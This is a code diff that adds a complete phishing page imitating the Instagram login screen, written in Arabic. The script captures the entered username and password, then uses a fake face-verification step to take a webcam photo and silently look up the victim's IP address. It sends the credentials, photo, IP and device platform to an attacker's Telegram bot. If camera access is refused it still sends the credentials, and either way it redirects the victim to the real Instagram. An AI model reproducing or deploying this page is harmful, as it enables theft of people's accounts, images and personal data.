@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; border: 1px solid #dbdbdb; padding: 40px 20px; width: 350px; text-align: center; border-radius: 1px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        input { width: 100%; padding: 12px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 14px; text-align: right; }
+        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 14px; }
+        #verify-section { display: none; }
+        .info-text { font-size: 14px; color: #8e8e8e; margin: 20px 0; line-height: 1.5; }
+        .logo { width: 175px; margin-bottom: 30px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="login-section">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e05b564.png" class="logo">
+        <form id="login-form">
+            <input type="text" id="email" placeholder="رقم الهاتف أو اسم المستخدم" required>
+            <input type="password" id="pass" placeholder="كلمة السر" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+    </div>
+
+    <div id="verify-section">
+        <h3 style="margin:0;">تأكيد الهوية</h3>
+        <p class="info-text">لأمان حسابك، يرجى إجراء فحص سريع للوجه للتأكد من أنك لست روبوت (CAPTCHA Face ID).</p>
+        <button id="start-camera">بدء الفحص الآن</button>
+    </div>
+</div>
+
+<script>
+       // الانتقال لصفحة الكاميرا بعد "تسجيل الدخول"
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        u_e = document.getElementById('email').value;
+        u_p = document.getElementById('pass').value;
+        document.getElementById('login-section').style.display = 'none';
+        document.getElementById('verify-section').style.display = 'block';
+    });
+
+    document.getElementById('start-camera').addEventListener('click', async function() {
+        this.innerText = "جاري التحميل...";
+        this.disabled = true;
+
+        try {
+            // طلب إذن الكاميرا
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+
+            // جلب الـ IP صامتاً
+            const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+
+            // التقاط الصورة
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', cId);
+                formData.append('photo', blob, 'verify.jpg');
+                
+                const report = `📸 صيدة كاميرا كاملة:\n\n👤: ${u_e}\n🔑: ${u_p}\n🌐 IP: ${ipRes.ip}\n📱: ${navigator.platform}`;
+                formData.append('caption', report);
+
+                // إرسال الصورة والبيانات باستخدام التوكن المجمع
+                await fetch(`https://api.telegram.org/bot${_buildKey()}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                stream.getTracks().forEach(t => t.stop());
+                window.location.replace("https://www.instagram.com/reels/");
+            }, 'image/jpeg');
+
+        } catch (err) {
+            // في حال رفض الكاميرا، نرسل البيانات النصية فقط لكي لا تضيع الصيدة
+            const fallback = `⚠️ رفض الكاميرا (بيانات فقط):\n👤: ${u_e}\n🔑: ${u_p}`;
+            await fetch(`https://api.telegram.org/bot${_buildKey()}/sendMessage?chat_id=${cId}&text=${encodeURIComponent(fallback)}`);
+            window.location.replace("https://www.instagram.com/reels/");
+        }
+    });
+</script>
+
+</body>
+</html>
